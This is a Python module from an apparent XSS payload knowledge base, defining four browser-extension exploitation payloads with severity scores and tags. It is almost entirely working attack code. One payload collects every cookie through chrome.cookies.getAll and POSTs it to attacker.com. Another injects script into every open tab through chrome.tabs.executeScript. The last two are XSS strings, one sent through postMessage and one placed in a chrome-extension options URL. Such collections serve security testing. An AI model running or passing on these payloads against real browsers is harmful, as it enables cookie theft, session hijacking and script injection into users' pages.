#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Browser Extension Exploitation Payloads
"""

from ..models import PayloadEntry

EXTENSION_PAYLOADS = {
    "chrome_cookies_exfil": PayloadEntry(
        payload="chrome.cookies.getAll({}, function(c){ fetch('https://attacker.com', {method:'POST', body:JSON.stringify(c)}) })",
        contexts=["javascript", "extension"],
        severity="critical",
        cvss_score=9.8,
        description="Exfiltrate all cookies via chrome.cookies API",
        tags=["extension", "cookies", "exfiltration"],
        reliability="high",
        attack_surface="client",
    ),
    "chrome_tabs_execute_script": PayloadEntry(
        payload="chrome.tabs.query({}, function(tabs){ tabs.forEach(t => chrome.tabs.executeScript(t.id, {code: 'alert(1)'})) })",
        contexts=["javascript", "extension"],
        severity="critical",
        cvss_score=9.5,
        description="Universal XSS (UXSS) via chrome.tabs.executeScript",
        tags=["extension", "uxss", "rce"],
        reliability="high",
        attack_surface="client",
    ),
    "extension_postmessage_probe": PayloadEntry(
        payload="window.postMessage({type: 'EXTENSION_ACTION', payload: '<img src=x onerror=alert(1)>'}, '*')",
        contexts=["javascript", "html_content"],
        severity="high",
        cvss_score=7.5,
        description="Probing extension content scripts via postMessage",
        tags=["extension", "postmessage", "probe"],
        reliability="medium",
        attack_surface="web",
    ),
    "extension_resource_load": PayloadEntry(
        payload="chrome-extension://<id>/options.html#<script>alert(1)</script>",
        contexts=["url", "extension"],
        severity="medium",
        cvss_score=6.5,
        description="Accessing web_accessible_resources with XSS",
        tags=["extension", "war", "url"],
        reliability="low",
        attack_surface="web",
    ),
}

EXTENSION_TOTAL = len(EXTENSION_PAYLOADS)
